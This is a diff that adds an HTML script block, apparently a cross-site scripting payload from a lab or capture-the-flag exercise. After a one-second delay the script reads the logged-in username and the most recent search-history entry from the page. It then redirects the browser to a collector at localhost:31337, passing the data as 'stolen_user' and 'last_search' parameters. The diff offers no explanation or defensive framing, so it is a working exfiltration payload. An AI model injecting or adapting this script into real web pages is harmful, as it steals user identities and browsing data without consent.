@@ -1,0 +1,8 @@
+<script>
+    setTimeout(function() {
+    var user=document.getElementById('logged-in-user').innerHTML;
+    var last_search=document.getElementById('history-list').children[1].innerHTML;
+    window.location.replace("http://localhost:31337/?stolen_user=" + user + "&last_search=" + last_search);
+    
+    }, 1000);
+</script>
